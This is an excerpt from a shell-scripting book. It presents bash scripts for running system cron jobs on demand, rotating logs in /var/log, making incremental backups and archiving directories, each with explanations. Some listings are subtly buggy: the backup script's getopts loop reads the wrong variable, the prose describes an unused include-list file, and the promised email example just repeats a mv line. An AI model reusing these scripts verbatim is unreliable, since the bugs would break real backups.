<p class="listcap"><a id="ch6ex10"/><em>Listing 6-10: Running the</em> <code><em>verifycron</em></code> <em>script on a</em> <code><em>cron</em></code> <em>file with invalid entries</em></p>&#13;
<p class="indent">The sample <code>crontab</code> file with the two errors, along with all the shell scripts explored in this book, are available at <em><a href="http://www.nostarch.com/wcss2/">http://www.nostarch.com/wcss2/</a></em>.</p>&#13;
<h4 class="h4" id="ch06lev2sec18"><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">A few enhancements would potentially be worth adding to this script. Validating the compatibility of month and day combinations would ensure that users don’t schedule a <code>cron</code> job to run on, for example, 31 February. It could also be useful to check whether the command being invoked can actually be found, but that would entail parsing and processing a <code>PATH</code> variable (that is, a list of directories within which to look for commands <span epub:type="pagebreak" id="page_159"/>specified in the script), which can be set explicitly within a <code>crontab</code> file. That could be quite tricky. . . . Lastly, you could add support for values such as <code>@hourly</code> or <code>@reboot</code>, special values in <code>cron</code> used to denote the common times scripts can run.</p>&#13;
<h3 class="h3" id="ch06lev1sec05"><strong>#49 Ensuring that System cron Jobs Are Run</strong></h3>&#13;
<p class="noindenta">Until recently, Linux systems were all designed to run as servers—up 24 hours a day, 7 days a week, forever. You can see that implicit expectation in the design of the <code>cron</code> facility: there’s no point in scheduling jobs for 2:17 <small>AM</small> every Thursday if the system is shut down at 6:00 <small>PM</small> every night.</p>&#13;
<p class="indent">Yet many modern Unix and Linux users are running on desktops and laptops and therefore do shut down their systems at the end of the day. It can be quite alien to OS X users, for example, to leave their systems running overnight, let alone over a weekend or holiday.</p>&#13;
<p class="indent">This isn’t a big deal with user <code>crontab</code> entries, because those that don’t run due to shutdown schedules can be tweaked to ensure that they do eventually get invoked. The problem arises when the daily, weekly, and monthly system <code>cron</code> jobs that are part of the underlying system are not run at the specified times.</p>&#13;
<p class="indent">That’s the purpose of the script in <a href="ch06.xhtml#ch6ex11">Listing 6-11</a>: to allow the administrator to invoke the daily, weekly, or monthly jobs directly from the command line, as needed.</p>&#13;
<h4 class="h4" id="ch06lev2sec19"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
&#13;
   # docron--Runs the daily, weekly, and monthly system cron jobs on a system&#13;
   #   that's likely to be shut down during the usual time of day when the system&#13;
   #   cron jobs would otherwise be scheduled to run.&#13;
&#13;
   rootcron="/etc/crontab"   # This is going to vary significantly based on&#13;
                             # which version of Unix or Linux you've got.&#13;
&#13;
   if [ $# -ne 1 ] ; then&#13;
     echo "Usage: $0 [daily|weekly|monthly]" &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   # If this script isn't being run by the administrator, fail out.&#13;
   #   In earlier scripts, you saw USER and LOGNAME being tested, but in&#13;
   #   this situation, we'll check the user ID value directly. Root = 0.&#13;
&#13;
   if [ "$(id -u)" -ne 0 ] ; then&#13;
     # Or you can use $(whoami) != "root" here, as needed.&#13;
     echo "$0: Command must be run as 'root'" &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   # We assume that the root cron has entries for 'daily', 'weekly', and&#13;
   #   'monthly' jobs. If we can't find a match for the one specified, well,&#13;
   #   that's an error. But first, we'll try to get the command if there is&#13;
   #   a match (which is what we expect).&#13;
&#13;
<span class="ent">➊</span> job="$(awk "NF &gt; 6 &amp;&amp; /$1/ { for (i=7;i&lt;=NF;i++) print \$i }" $rootcron)"&#13;
&#13;
   if [ -z "$job" ] ; then   # No job? Weird. Okay, that's an error.&#13;
     echo "$0: Error: no $1 job found in $rootcron" &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   SHELL=$(which sh)        # To be consistent with cron's default&#13;
&#13;
<span class="ent">➋</span> eval $job                # We'll exit once the job is finished.</pre>&#13;
<p class="listcap"><span epub:type="pagebreak" id="page_160"/><a id="ch6ex11"/><em>Listing 6-11: The</em> <code><em>docron</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch06lev2sec20"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">The <code>cron</code> jobs located in <em>/etc/daily</em>, <em>/etc/weekly</em>, and <em>/etc/monthly</em> (or <em>/etc/cron.daily</em>, <em>/etc/cron.weekly</em>, and <em>/etc/cron.monthly</em>) are set up completely differently from user <code>crontab</code> files: each is a directory that contains a set of scripts, one per job, that are run by the <code>crontab</code> facility, as specified in the <em>/etc/crontab</em> file. To make this even more confusing, the format of the <em>/etc/crontab</em> file is different too, because it adds an additional field that indicates what effective user ID should run the job.</p>&#13;
<p class="indent">The <em>/etc/crontab</em> file specifies the hour of the day (in the second column of the output that follows) at which to run the daily, weekly, and monthly jobs in a format that’s completely different from what you’ve seen as a regular Linux user, as shown here:</p>&#13;
<pre class="programs">$ <span class="codestrong">egrep '(daily|weekly|monthly)' /etc/crontab</span>&#13;
# Run daily/weekly/monthly jobs.&#13;
15      3       *       *       *       root    periodic daily&#13;
30      4       *       *       6       root    periodic weekly&#13;
30      5       1       *       *       root    periodic monthly</pre>&#13;
<p class="indent">What happens to the daily, weekly, and monthly jobs if this system isn’t running at 3:15 <small>AM</small> every night, at 4:30 <small>AM</small> on Saturday morning, and at 5:30 <small>AM</small> on the first of each month? Nothing. They just don’t run.</p>&#13;
<p class="indent">Rather than trying to force <code>cron</code> to run the jobs, the script we’ve written identifies the jobs in this file <span class="ent">➊</span> and runs them directly with the <code>eval</code> on the very last line <span class="ent">➋</span>. The only difference between invoking the jobs found from this script and invoking them as part of a <code>cron</code> job is that when jobs are run from <code>cron</code>, their output stream is automatically turned into an email message, whereas this script displays the output stream on the screen.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_161"/>You could, of course, duplicate <code>cron</code>’s email behavior by invoking the script as shown here:</p>&#13;
<pre class="programs">./docron weekly | mail -E -s "weekly cron job" admin</pre>&#13;
<h4 class="h4" id="ch06lev2sec21"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">This script must be run as root and has one parameter—either <code>daily</code>, <code>weekly</code>, or <code>monthly</code>—to indicate which group of system <code>cron</code> jobs you want to run. As usual, we highly recommend using <code>sudo</code> to run any script as root.</p>&#13;
<h4 class="h4" id="ch06lev2sec22"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">This script has essentially no direct output and displays only results from scripts run in the <code>crontab</code>, unless an error is encountered either within the script or within one of the jobs spawned by the <code>cron</code> scripts.</p>&#13;
<h4 class="h4" id="ch06lev2sec23"><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">Some jobs shouldn’t be run more than once a week or once a month, so there really should be some sort of check in place to ensure they aren’t run more often. Furthermore, sometimes the recurring system jobs might well run from <code>cron</code>, so we can’t make a blanket assumption that if <code>docron</code> hasn’t run, the jobs haven’t run.</p>&#13;
<p class="indent">One solution would be to create three empty timestamp files, one each for daily, weekly, and monthly jobs, and then to add new entries to the <em>/etc/daily</em>, <em>/etc/weekly</em>, and <em>/etc/monthly</em> directories that update the last-modified date of each timestamp file with <code>touch</code>. This would solve half the problem: <code>docron</code> could then check the last time the recurring <code>cron</code> job was invoked and quit if an insufficient amount of time had passed to justify the job’s being run again.</p>&#13;
<p class="indent">The situation this solution doesn’t handle is this: six weeks after the monthly <code>cron</code> job last ran, the admin runs <code>docron</code> to invoke the monthly jobs. Then four days later, someone forgets to shut off their computer, and the monthly <code>cron</code> job is invoked. How can that job know that it’s not necessary to run the monthly jobs after all?</p>&#13;
<p class="indent">Two scripts can be added to the appropriate directory. One script must run first from <code>run-script</code> or <code>periodic</code> (the standard ways to invoke <code>cron</code> jobs) and can then turn off the executable bit on all other scripts in the directory except its partner script, which turns the executable bit back on after <code>run-script</code> or <code>periodic</code> has scanned and ascertained that there’s nothing to do: none of the files in the directory appear to be executable, and therefore <code>cron</code> doesn’t run them. This is not a great solution, however, because there’s no guarantee of script evaluation order, and if we can’t guarantee the order in which the new scripts will be run, the entire solution fails.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_162"/>There might not be a complete solution to this dilemma, actually. Or it might involve writing a wrapper for <code>run-script</code> or <code>periodic</code> that would know how to manage timestamps to ensure that jobs weren’t executed too frequently. Or maybe we’re worrying about something that’s not really that big a deal in the big picture. <img src="../images/common1.jpg" alt="image"/></p>&#13;
<h3 class="h3" id="ch06lev1sec06"><strong>#50 Rotating Log Files</strong></h3>&#13;
<p class="noindenta">Users who don’t have much experience with Linux can be quite surprised by how many commands, utilities, and daemons log events to system log files. Even on a computer with lots of disk space, it’s important to keep an eye on the size of these files—and, of course, on their contents.</p>&#13;
<p class="indent">As a result, many sysadmins have a set of instructions that they place at the top of their log file analysis utilities, similar to the commands shown here:</p>&#13;
<pre class="programs">mv $log.2 $log.3&#13;
mv $log.1 $log.2&#13;
mv $log $log.1&#13;
touch $log</pre>&#13;
<p class="indent">If run weekly, this would produce a rolling one-month archive of log file information divided into week-size portions of data. However, it’s just as easy to create a script that accomplishes this for all log files in the <em>/var/log</em> directory at once, thereby relieving any log file analysis scripts of the burden and managing logs even in months when the admin doesn’t analyze anything.</p>&#13;
<p class="indent">The script in <a href="ch06.xhtml#ch6ex12">Listing 6-12</a> steps through each file in the <em>/var/log</em> directory that matches a particular set of criteria, checking each matching file’s rotation schedule and last-modified date to see whether it’s time for the file to be rotated. If it is time for a rotation, the script does just that.</p>&#13;
<h4 class="h4" id="ch06lev2sec24"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">#!/bin/bash&#13;
# rotatelogs--Rolls logfiles in /var/log for archival purposes and to ensure&#13;
#   that the files don't get unmanageably large. This script uses a config&#13;
#   file to allow customization of how frequently each log should be rolled.&#13;
#   The config file is in logfilename=duration format, where duration is&#13;
#   in days. If, in the config file, an entry is missing for a particular&#13;
#   logfilename, rotatelogs won't rotate the file more frequently than every&#13;
#   seven days. If duration is set to zero, the script will ignore that&#13;
#   particular set of log files.&#13;
&#13;
logdir="/var/log"             # Your logfile directory could vary.&#13;
config="$logdir/rotatelogs.conf"&#13;
mv="/bin/mv"&#13;
&#13;
<span epub:type="pagebreak" id="page_163"/>default_duration=7     # We'll default to a 7-day rotation schedule.&#13;
count=0&#13;
&#13;
duration=$default_duration&#13;
&#13;
if [ ! -f $config ] ; then&#13;
  # No config file for this script? We're out. You could also safely remove&#13;
  #   this test and simply ignore customizations when the config file is&#13;
  #   missing.&#13;
  echo "$0: no config file found. Can't proceed." &gt;&amp;2&#13;
  exit 1&#13;
fi&#13;
&#13;
if [ ! -w $logdir -o ! -x $logdir ] ; then&#13;
  # -w is write permission and -x is execute. You need both to create new&#13;
  #   files in a Unix or Linux directory. If you don't have 'em, we fail.&#13;
  echo "$0: you don't have the appropriate permissions in $logdir" &gt;&amp;2&#13;
  exit 1&#13;
fi&#13;
&#13;
cd $logdir&#13;
&#13;
# While we'd like to use a standardized set notation like :digit: with&#13;
#   the find, many versions of find don't support POSIX character class&#13;
#   identifiers--hence [0-9].&#13;
&#13;
# This is a pretty gnarly find statement that's explained in the prose&#13;
#   further in this section. Keep reading if you're curious!&#13;
&#13;
for name in $(<span class="ent">➊</span>find . -maxdepth 1 -type f -size +0c ! -name '*[0-9]*' \&#13;
     ! -name '\.*' ! -name '*conf' -print | sed 's/^\.\///')&#13;
do&#13;
&#13;
  count=$(( $count + 1 ))&#13;
  # Grab the matching entry from the config file for this particular log file.&#13;
&#13;
  duration="$(grep "^${name}=" $config|cut -d= -f2)"&#13;
&#13;
  if [ -z "$duration" ] ; then&#13;
    duration=$default_duration   # If there isn't a match, use the default.&#13;
  elif [ "$duration" = "0" ] ; then&#13;
    echo "Duration set to zero: skipping $name"&#13;
    continue&#13;
  fi&#13;
&#13;
  # Set up the rotation filenames. Easy enough:&#13;
&#13;
  back1="${name}.1"; back2="${name}.2";&#13;
  back3="${name}.3"; back4="${name}.4";&#13;
&#13;
  # If the most recently rolled log file (back1) has been modified within&#13;
  #   the specific quantum, then it's not time to rotate it. This can be&#13;
  #   found with the -mtime modification time test to find.&#13;
<span epub:type="pagebreak" id="page_164"/>&#13;
  if [ -f "$back1" ] ; then&#13;
    if [ -z "$(find \"$back1\" -mtime +$duration -print 2&gt;/dev/null)" ]&#13;
    then&#13;
      /bin/echo -n "$name's most recent backup is more recent than $duration "&#13;
      echo "days: skipping" ;   continue&#13;
    fi&#13;
  fi&#13;
&#13;
  echo "Rotating log $name (using a $duration day schedule)"&#13;
&#13;
  # Rotate, starting with the oldest log, but be careful in case one&#13;
  #   or more files simply don't exist yet.&#13;
&#13;
  if [ -f "$back3" ] ; then&#13;
    echo "... $back3 -&gt; $back4" ; $mv -f "$back3" "$back4"&#13;
  fi&#13;
  if [ -f "$back2" ] ; then&#13;
    echo "... $back2 -&gt; $back3" ; $mv -f "$back2" "$back3"&#13;
  fi&#13;
  if [ -f "$back1" ] ; then&#13;
    echo "... $back1 -&gt; $back2" ; $mv -f "$back1" "$back2"&#13;
  fi&#13;
  if [ -f "$name" ] ; then&#13;
    echo "... $name -&gt; $back1" ; $mv -f "$name" "$back1"&#13;
  fi&#13;
  touch "$name"&#13;
  chmod 0600 "$name"    # Last step: Change file to rw------- for privacy&#13;
done&#13;
&#13;
if [ $count -eq 0 ] ; then&#13;
  echo "Nothing to do: no log files big enough or old enough to rotate"&#13;
fi&#13;
&#13;
exit 0</pre>&#13;
<p class="listcap"><a id="ch6ex12"/><em>Listing 6-12: The</em> <code><em>rotatelogs</em></code> <em>script</em></p>&#13;
<p class="indent">To be maximally useful, the script works with a configuration file that lives in <em>/var/log</em>, allowing the administrator to specify different rotation schedules for different log files. The contents of a typical configuration file are shown in <a href="ch06.xhtml#ch6ex13">Listing 6-13</a>.</p>&#13;
<pre class="programs"># Configuration file for the log rotation script: Format is name=duration,&#13;
#   where name can be any filename that appears in the /var/log directory.&#13;
#   Duration is measured in days.&#13;
&#13;
ftp.log=30&#13;
lastlog=14&#13;
lookupd.log=7&#13;
lpr.log=30&#13;
mail.log=7&#13;
netinfo.log=7&#13;
secure.log=7&#13;
statistics=7&#13;
system.log=14&#13;
# Anything with a duration of zero is not rotated.&#13;
wtmp=0</pre>&#13;
<p class="listcap"><span epub:type="pagebreak" id="page_165"/><a id="ch6ex13"/><em>Listing 6-13: An example configuration file for the</em> <code><em>rotatelogs</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch06lev2sec25"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">The heart of this script, and certainly the most gnarly part, is the <code>find</code> statement at <span class="ent">➊</span>. The <code>find</code> statement creates a loop, returning all files in the <em>/var/log</em> directory that are greater than zero characters in size, don’t contain a number in their name, don’t start with a period (OS X in particular dumps a lot of oddly named log files in this directory—they all need to be skipped), and don’t end with <em>conf</em> (we don’t want to rotate out the <em>rotatelogs.conf</em> file, for obvious reasons). <code>maxdepth 1</code> ensures that <code>find</code> doesn’t step into subdirectories, and the <code>sed</code> invocation at the very end removes any leading <code>./</code> sequences from the matches.</p>&#13;
<div class="note">&#13;
<p class="notet"><span class="noteg"><strong>NOTE</strong></span></p>&#13;
<p class="notep"><em>Lazy is good! The</em> <code><em>rotatelogs</em></code> <em>script demonstrates a fundamental concept in shell script programming: the value of avoiding duplicate work. Rather than have each log analysis script rotate logs, a single log rotation script centralizes the task and makes modifications easy.</em></p>&#13;
</div>&#13;
<h4 class="h4" id="ch06lev2sec26"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">This script doesn’t accept any arguments, but it does print messages on which logs are being rotated and why. It should also be run as root.</p>&#13;
<h4 class="h4" id="ch06lev2sec27"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">The <code>rotatelogs</code> script is simple to use, as shown in <a href="ch06.xhtml#ch6ex14">Listing 6-14</a>, but beware that depending on file permissions, it might need to be run as root.</p>&#13;
<pre class="programs">$ <span class="codestrong">sudo rotatelogs</span>&#13;
ftp.log's most recent backup is more recent than 30 days: skipping&#13;
Rotating log lastlog (using a 14 day schedule)&#13;
... lastlog -&gt; lastlog.1&#13;
lpr.log's most recent backup is more recent than 30 days: skipping</pre>&#13;
<p class="listcap"><a id="ch6ex14"/><em>Listing 6-14: Running the</em> <code><em>rotatelogs</em></code> <em>script as root to rotate the logs in</em> /var/log</p>&#13;
<p class="indent">Notice that only three log files matched the specified <code>find</code> criteria in this invocation. Of these, only <code>lastlog</code> hadn’t been backed up sufficiently recently, according to the duration values in the configuration file. Run <code>rotatelogs</code> again, however, and nothing’s done, as <a href="ch06.xhtml#ch6ex15">Listing 6-15</a> shows.</p>&#13;
<pre class="programs"><span epub:type="pagebreak" id="page_166"/>$ <span class="codestrong">sudo rotatelogs</span>&#13;
ftp.log's most recent backup is more recent than 30 days: skipping&#13;
lastlog's most recent backup is more recent than 14 days: skipping&#13;
lpr.log's most recent backup is more recent than 30 days: skipping</pre>&#13;
<p class="listcap"><a id="ch6ex15"/><em>Listing 6-15: Running the</em> <code><em>rotatelogs</em></code> <em>again shows that no more logs need to be rotated.</em></p>&#13;
<h4 class="h4" id="ch06lev2sec28"><em><strong>Hacking the Script</strong></em></h4>&#13;
<p class="noindenta">One way to make this script even more useful is to have the oldest archive file, the old <code>$back4</code> file, emailed or copied to a cloud storage site before it’s overwritten by the <code>mv</code> command. For the simple case of email, the script might just look like this:</p>&#13;
<pre class="programs">echo "... $back3 -&gt; $back4" ; $mv -f "$back3" "$back4"</pre>&#13;
<p class="indent">Another useful enhancement to <code>rotatelogs</code> would be to compress all rotated logs to further save on disk space; this would require that the script recognize and work properly with compressed files as it proceeded.</p>&#13;
<h3 class="h3" id="ch06lev1sec07"><strong>#51 Managing Backups</strong></h3>&#13;
<p class="noindenta">Managing system backups is a task that all system administrators are familiar with, and it’s about as thankless as a job can be. No one ever says, “Hey, that backup’s working—nice job!” Even on a single-user Linux computer, some sort of backup schedule is essential. Unfortunately, it’s usually only after you’ve been burned once, losing both data and files, that you realize the value of a regular backup. One of the reasons so many Linux systems neglect backups is that many of the backup tools are crude and difficult to understand.</p>&#13;
<p class="indent">A shell script can solve this problem! The script in <a href="ch06.xhtml#ch6ex16">Listing 6-16</a> backs up a specified set of directories, either incrementally (that is, only those files that have changed since the last backup) or as a full backup (all files). The backup is compressed on the fly to minimize disk space used, and the script output can be directed to a file, a tape device, a remotely mounted NFS partition, a cloud backup service (like we set up later in the book), or even a DVD.</p>&#13;
<h4 class="h4" id="ch06lev2sec29"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
&#13;
   # backup--Creates either a full or incremental backup of a set of defined&#13;
   #   directories on the system. By default, the output file is compressed and&#13;
   #   saved in /tmp with a timestamped filename. Otherwise, specify an output&#13;
   #   device (another disk, a removable storage device, or whatever else floats&#13;
   #   your boat).&#13;
&#13;
<span epub:type="pagebreak" id="page_167"/>&#13;
   compress="bzip2"                 # Change to your favorite compression app.&#13;
    inclist="/tmp/backup.inclist.$(date +%d%m%y)"&#13;
     output="/tmp/backup.$(date +%d%m%y).bz2"&#13;
     tsfile="$HOME/.backup.timestamp"&#13;
      btype="incremental"           # Default to an incremental backup.&#13;
      noinc=0                       # And here's an update of the timestamp.&#13;
&#13;
   trap "/bin/rm -f $inclist" EXIT&#13;
&#13;
   usageQuit()&#13;
   {&#13;
     cat &lt;&lt; "EOF" &gt;&amp;2&#13;
   Usage: $0 [-o output] [-i|-f] [-n]&#13;
     -o lets you specify an alternative backup file/device,&#13;
     -i is an incremental, -f is a full backup, and -n prevents&#13;
     updating the timestamp when an incremental backup is done.&#13;
   EOF&#13;
     exit 1&#13;
   }&#13;
&#13;
   ########## Main code section begins here ###########&#13;
&#13;
   while getopts "o:ifn" arg; do&#13;
     case "$opt" in&#13;
       o ) output="$OPTARG";       ;;   # getopts automatically manages OPTARG.&#13;
       i ) btype="incremental";    ;;&#13;
       f ) btype="full";           ;;&#13;
       n ) noinc=1;                ;;&#13;
       ? ) usageQuit               ;;&#13;
     esac&#13;
   done&#13;
&#13;
   shift $(( $OPTIND - 1 ))&#13;
&#13;
   echo "Doing $btype backup, saving output to $output"&#13;
&#13;
   timestamp="$(date +'%m%d%I%M')"  # Grab month, day, hour, minute from date.&#13;
                                    # Curious about date formats? "man strftime"&#13;
&#13;
   if [ "$btype" = "incremental" ] ; then&#13;
     if [ ! -f $tsfile ] ; then&#13;
       echo "Error: can't do an incremental backup: no timestamp file" &gt;&amp;2&#13;
       exit 1&#13;
     fi&#13;
     find $HOME -depth -type f -newer $tsfile -user ${USER:-LOGNAME} | \&#13;
<span class="ent">➊</span>   pax -w -x tar | $compress &gt; $output&#13;
     failure="$?"&#13;
   else&#13;
     find $HOME -depth -type f -user ${USER:-LOGNAME} | \&#13;
<span class="ent">➋</span>   pax -w -x tar | $compress &gt; $output&#13;
     failure="$?"&#13;
   fi&#13;
&#13;
   if [ "$noinc" = "0" -a "$failure" = "0" ] ; then&#13;
     touch -t $timestamp $tsfile&#13;
   fi&#13;
   exit 0</pre>&#13;
<p class="listcap"><span epub:type="pagebreak" id="page_168"/><a id="ch6ex16"/><em>Listing 6-16: The</em> <code><em>backup</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch06lev2sec30"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">For a full system backup, the <code>pax</code> command at <span class="ent">➊</span> and <span class="ent">➋</span> does all the work, piping its output to a compression program (<code>bzip2</code> by default) and then to an output file or device. An incremental backup is a bit trickier, because the standard version of <code>tar</code> doesn’t include any sort of modification time test, unlike the GNU version of <code>tar</code>. The list of files modified since the previous backup is built with <code>find</code> and saved in the <code>inclist</code> temporary file. That file, emulating the <code>tar</code> output format for increased portability, is then fed to <code>pax</code> directly.</p>&#13;
<p class="indent">Choosing when to mark the timestamp for a backup is an area in which many backup programs get messed up, typically marking the “last backup time” as when the program has finished the backup, rather than when it started. Setting the timestamp to the time of backup completion can be a problem if any files are modified during the backup process, which becomes more likely as individual backups take longer to complete. Because files modified under this scenario would have a last-modified date older than the timestamp date, they would not be backed up the next time an incremental backup is run, which would be bad.</p>&#13;
<p class="indent">But hold on, because setting the timestamp to <em>before</em> the backup takes place is wrong too: if the backup fails for some reason, there’s no way to reverse the updated timestamp.</p>&#13;
<p class="indent">Both of these problems can be avoided by saving the date and time before the backup starts (in the <code>timestamp</code> variable) but waiting to apply the value of <code>$timestamp</code> to <code>$tsfile</code> using the <code>-t</code> flag to <code>touch</code> only <em>after</em> the backup has succeeded. Subtle, eh?</p>&#13;
<h4 class="h4" id="ch06lev2sec31"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">This script has a number of options, all of which can be ignored to perform the default incremental backup based on which files have been modified since the last time the script was run (that is, since the timestamp from the last incremental backup). Starting parameters allow you to specify a different output file or device (<code>-o output</code>), to choose a full backup (<code>-f</code>), to actively choose an incremental backup (<code>-i</code>) even though it is the default, or to prevent the timestamp file from being updated in the case of an incremental backup (<code>-n</code>).</p>&#13;
<h4 class="h4" id="ch06lev2sec32"><em><strong>The Results</strong></em></h4>&#13;
<p class="noindenta">The <code>backup</code> script requires no arguments and is simple to run, as <a href="ch06.xhtml#ch6ex17">Listing 6-17</a> details.</p>&#13;
<pre class="programs"><span epub:type="pagebreak" id="page_169"/>$ <span class="codestrong">backup</span>&#13;
Doing incremental backup, saving output to /tmp/backup.140703.bz2</pre>&#13;
<p class="listcap"><a id="ch6ex17"/><em>Listing 6-17: Running the</em> <code><em>backup</em></code> <em>script requires no arguments and prints the results to screen.</em></p>&#13;
<p class="indent">As you would expect, the output of a backup program isn’t very scintillating. But the resulting compressed file is sufficiently large that it shows plenty of data is within, as you can see in <a href="ch06.xhtml#ch6ex18">Listing 6-18</a>.</p>&#13;
<pre class="programs">$ <span class="codestrong">ls -l /tmp/backup*</span>&#13;
-rw-r--r--  1 taylor  wheel  621739008 Jul 14 07:31 backup.140703.bz2</pre>&#13;
<p class="listcap"><a id="ch6ex18"/><em>Listing 6-18: Displaying the backed-up file with</em> <code><em>ls</em></code></p>&#13;
<h3 class="h3" id="ch06lev1sec08"><strong>#52 Backing Up Directories</strong></h3>&#13;
<p class="noindenta">Related to the task of backing up entire filesystems is the user-centric task of taking a snapshot of a specific directory or directory tree. The simple script in <a href="ch06.xhtml#ch6ex19">Listing 6-19</a> allows users to create a compressed <code>tar</code> archive of a specified directory for archival or sharing purposes.</p>&#13;
<h4 class="h4" id="ch06lev2sec33"><em><strong>The Code</strong></em></h4>&#13;
<pre class="programs">   #!/bin/bash&#13;
&#13;
   # archivedir--Creates a compressed archive of the specified directory&#13;
&#13;
   maxarchivedir=10           # Size, in blocks, of big directory.&#13;
   compress=gzip              # Change to your favorite compress app.&#13;
   progname=$(basename $0)    # Nicer output format for error messages.&#13;
&#13;
   if [ $# -eq 0 ] ; then     # No args? That's a problem.&#13;
     echo "Usage: $progname directory" &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   if [ ! -d $1 ] ; then&#13;
     echo "${progname}: can't find directory $1 to archive." &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   if [ "$(basename $1)" != "$1" -o "$1" = "." ] ; then&#13;
     echo "${progname}: You must specify a subdirectory" &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
<span class="ent">➊</span> if [ ! -w . ] ; then&#13;
     echo "${progname}: cannot write archive file to current directory." &gt;&amp;2&#13;
     exit 1&#13;
   fi&#13;
&#13;
   # Is the resultant archive going to be dangerously big? Let's check...&#13;
&#13;
   dirsize="$(du -s $1 | awk '{print $1}')"&#13;
&#13;
   if [ $dirsize -gt $maxarchivedir ] ; then&#13;
     /bin/echo -n "Warning: directory $1 is $dirsize blocks. Proceed? [n] "&#13;
     read answer&#13;
     answer="$(echo $answer | tr '[:upper:]' '[:lower:]' | cut -c1)"&#13;
     if [ "$answer" != "y" ] ; then&#13;
       echo "${progname}: archive of directory $1 canceled." &gt;&amp;2&#13;
       exit 0&#13;
     fi&#13;
   fi&#13;
&#13;
   archivename="$1.tgz"&#13;
&#13;
   if <span class="ent">➋</span>tar cf - $1 | $compress &gt; $archivename ; then&#13;
     echo "Directory $1 archived as $archivename"&#13;
   else&#13;
     echo "Warning: tar encountered errors archiving $1"&#13;
   fi&#13;
&#13;
   exit 0</pre>&#13;
<p class="listcap"><span epub:type="pagebreak" id="page_170"/><a id="ch6ex19"/><em>Listing 6-19: The</em> <code><em>archivedir</em></code> <em>script</em></p>&#13;
<h4 class="h4" id="ch06lev2sec34"><em><strong>How It Works</strong></em></h4>&#13;
<p class="noindenta">This script is almost all error-checking code, to ensure that it never causes a loss of data or creates an incorrect snapshot. In addition to using the typical tests to validate the presence and appropriateness of the starting argument, this script forces the user to be in the parent directory of the subdirectory to be compressed and archived, ensuring that the archive file is saved in the proper place upon completion. The test <code>if [ ! -w . ]</code> <span class="ent">➊</span> verifies that the user has write permission on the current directory. And this script even warns users before archiving if the resultant backup file would be unusually large.</p>&#13;
<p class="indent">Finally, the actual command that archives the specified directory is <code>tar</code> <span class="ent">➋</span>. The return code of this command is tested to ensure that the script never deletes the directory if an error of any sort occurs.</p>&#13;
<h4 class="h4" id="ch06lev2sec35"><em><strong>Running the Script</strong></em></h4>&#13;
<p class="noindenta">This script should be invoked with the name of the desired directory to archive as its only argument. To ensure that the script doesn’t try to archive itself, it requires that a subdirectory of the current directory be specified as the argument, rather than <code>.</code>, as <a href="ch06.xhtml#ch6ex20">Listing 6-20</a> shows.</p>&#13;
<h4 class="h4" id="ch06lev2sec36"><span epub:type="pagebreak" id="page_171"/><em><strong>The Results</strong></em></h4>&#13;
<pre class="programs">$ <span class="codestrong">archivedir scripts</span>&#13;
Warning: directory scripts is 2224 blocks. Proceed? [n] <span class="codestrong">n</span>&#13;
archivedir: archive of directory scripts canceled.</pre>&#13;
<p class="listcap"><a id="ch6ex20"/><em>Listing 6-20: Running the</em> <code><em>archivedir</em></code> <em>script on the</em> scripts <em>directory, but canceling</em></p>&#13;
<p class="indent">This seemed as though it might be a big archive, so we hesitated to create it, but after thinking about it, we decided there’s no reason not to proceed after all.</p>&#13;
<pre class="programs">$ <span class="codestrong">archivedir scripts</span>&#13;
Warning: directory scripts is 2224 blocks. Proceed? [n] <span class="codestrong">y</span>&#13;
Directory scripts archived as scripts.tgz</pre>&#13;
<p class="indent">Here are the results:</p>&#13;
<pre class="programs">$ <span class="codestrong">ls -l scripts.tgz</span>&#13;
-rw-r--r--  1 taylor  staff  325648 Jul 14 08:01 scripts.tgz</pre>&#13;
<div class="note">&#13;
<p class="notet"><span class="noteg"><strong>NOTE</strong></span></p>&#13;
<p class="notep"><em>Here’s a tip for developers: when actively working on a project, use</em> <code><em>archivedir</em></code> <em>in a</em> <code><em>cron</em></code> <em>job to automatically take a snapshot of your working code each night for archival purposes.</em><span epub:type="pagebreak" id="page_172"/></p>&#13;
</div>&#13;
</body></html>